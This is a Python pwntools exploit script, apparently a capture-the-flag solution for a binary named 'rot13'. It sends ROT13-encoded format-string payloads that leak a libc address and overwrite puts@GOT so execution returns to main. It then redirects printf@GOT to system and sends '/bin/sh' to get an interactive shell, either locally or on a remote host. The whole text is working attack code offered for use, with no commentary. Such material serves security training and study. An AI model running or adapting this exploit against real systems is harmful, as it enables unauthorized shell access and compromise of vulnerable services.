#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

import codecs

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./rot13"
libc = ELF("./libc.so.6")
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("example.com", 4444)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b *main+669
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


def rot13(buf):
    return codecs.encode(buf.decode(), "rot-13")

# libc leak & ret2main (puts@got -> main)
main_addr = elf.symbols['main']
payload = b"%43$p"# leak __libc_start_main+0xf3
payload += "%{0}c%11$hn".format((main_addr & 0xffff) - len(payload) - 9).encode()
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got['puts'])

sleep(0.5)
p.sendline(rot13(payload))

leak = eval(p.recv(14))
log.info("leak: " + hex(leak))
libc_base = leak - libc.symbols['__libc_start_main'] - 0xf3
log.info("libc base: " + hex(libc_base))

# GOT Overwrite (printf -> system)
system_libc_addr = libc_base + libc.symbols['system']
log.info("system@libc: " + hex(system_libc_addr))
payload = "%{0}c%12$hhn".format(system_libc_addr >> 16 & 0xff).encode()
payload += "%{0}c%13$hn".format((system_libc_addr & 0xffff) - len(payload) - (system_libc_addr >> 16 & 0xff) + 0xc).encode()
payload += b'B' * (8 - (len(payload) % 8))
payload += p64(elf.got['printf'] + 2)
payload += p64(elf.got['printf'])

sleep(0.5)
p.sendline(rot13(payload))

sleep(0.5)
p.sendline(rot13(b'/bin/sh'))

p.interactive()
